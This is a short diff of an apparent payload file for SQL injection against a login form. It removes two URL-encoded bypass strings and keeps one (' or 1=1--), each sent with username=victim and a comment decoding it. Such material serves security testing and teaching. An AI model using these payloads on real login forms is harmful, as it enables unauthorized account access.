@@ -1,8 +1,2 @@
-username=victim&password=%27%20OR%20%271%27%3D%271
-/* the input was ' OR '1'='1 */
-
-username=victim&password=%27%20OR%20%271%27%3D%271%27--%27
-/* the input was ' OR '1'='1'--' */
-
 username=victim&password=%27%20or%201%3D1--%20
 /* the input was ' or 1=1-- */
